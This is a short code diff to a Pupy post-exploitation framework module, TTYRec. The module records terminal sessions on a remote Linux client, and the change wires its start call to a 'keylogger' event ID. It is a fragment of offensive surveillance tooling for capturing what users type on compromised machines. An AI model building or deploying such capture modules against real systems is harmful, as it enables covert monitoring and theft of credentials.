@@ -9,6 +9,8 @@ from StringIO import StringIO
 from pupylib.PupyModule import PupyModule, PupyArgumentParser
 from pupylib.PupyModule import config
 
+KEYLOGGER_EVENT = 0x14000001
+
 __class_name__ = 'TTYRec'
 
 @config(cat='gather', compat=['linux'])
@@ -42,7 +44,7 @@ class TTYRec(PupyModule):
     def start(self, args):
         start = self.client.remote('ttyrec', 'start', False)
 
-        if start():
+        if start(event_id=KEYLOGGER_EVENT):
             self.success('TTYRec started')
 
     def stop(self, args):
